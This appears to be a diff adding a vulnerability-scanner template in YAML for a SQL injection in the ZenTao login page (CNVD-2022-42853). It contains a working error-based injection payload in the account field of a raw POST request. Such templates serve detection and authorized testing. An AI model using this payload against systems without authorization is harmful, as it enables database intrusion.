@@ -1,0 +1,25 @@
+id: poc-yaml-zentao-sqli-cnvd-2022-42853
+
+info:
+  name: poc-yaml-zentao-sqli-cnvd-2022-42853
+  author: z92g(https://github.com/z92g)
+  severity: high
+  tags: xray-converted,sqli,cnvd-2022-42853,ct-456784
+  reference:
+    - http://wiki.peiqi.tech/wiki/cms/%E7%A6%85%E9%81%93/%E7%A6%85%E9%81%93%2016.5%20router.class.php%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.html
+
+http:
+  - raw:
+      - |
+        POST /zentao/user-login.html HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        Referer: http://{{url}}/zentao/user-login.html
+
+        account=admin'+and+(select+extractvalue(1,concat(0x7e,(select+SUBSTR(MD5({{rand_int(1000, 9999)}}),9,16)),0x7e)))#
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
